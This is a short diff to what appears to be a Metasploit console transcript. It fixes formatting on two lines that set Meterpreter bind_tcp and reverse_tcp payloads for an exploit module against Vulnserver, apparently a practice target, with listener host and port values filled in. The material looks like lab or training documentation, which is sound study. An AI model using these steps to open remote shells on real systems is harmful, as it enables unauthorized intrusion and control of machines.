@@ -115,7 +115,7 @@ msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
 LHOST => 192.168.1.4
 msf6 exploit(windows/vulnserver/knock) > set LPORT 19521
 LPORT => 19521
-- msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
+msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
 PAYLOAD => windows/meterpreter/bind_tcp
 msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
 RPORT => 9999
@@ -141,7 +141,7 @@ msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
 LHOST => 192.168.1.4
 msf6 exploit(windows/vulnserver/knock) > set LPORT 13421
 LPORT => 13421
-- msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
 RPORT => 9999
